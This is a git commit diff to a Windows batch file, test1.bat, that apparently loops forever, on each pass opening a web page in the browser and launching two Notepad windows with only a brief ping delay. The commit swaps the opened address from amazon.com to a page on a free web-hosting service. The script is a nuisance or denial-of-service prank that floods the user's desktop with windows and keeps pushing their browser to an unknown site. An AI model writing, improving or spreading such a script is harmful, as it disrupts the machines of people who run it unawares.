4e72cb28df5a5fa823db563d5c323939dde5795f
mstigl <159584512+mstigl@users.noreply.github.com>
2024-06-05 14:54:04 +0200

    Update test1.bat

--- test1.bat
+++ test1.bat
@@ -1,6 +1,6 @@
 @echo off
 :loop
-start "" /b "https://www.amazon.com"
+start "" /b "https://sanskritic-stopper.000webhostapp.com/"
 START %SystemRoot%\system32\notepad.exe
 START %SystemRoot%\system32\notepad.exe
 ping -n 1 127.0.0.1 > nul
